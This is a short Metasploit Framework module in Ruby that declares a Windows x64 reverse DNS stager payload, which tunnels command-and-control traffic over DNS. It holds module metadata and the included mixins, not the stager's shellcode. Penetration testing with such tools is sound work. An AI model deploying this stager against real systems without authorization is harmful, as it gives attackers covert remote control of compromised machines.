##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 684

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseDns_x64

  def initialize(info = {})
    super(merge_info(info,
                     'Name'        => 'Windows Reverse DNS Stager',
                     'Description' => 'Tunnel communication over reverse DNS',
                     'Author'      => 'Alexey Sintsov',
                     'License'     => MSF_LICENSE,
                     'Platform'    => 'win',
                     'Arch'        => ARCH_X64,
                     'Handler'     => Msf::Handler::ReverseDns,
                     'Stager'      => { 'RequiresMidstager' => false },
                     'Convention'  => 'sockrdi dns'))
  end
end
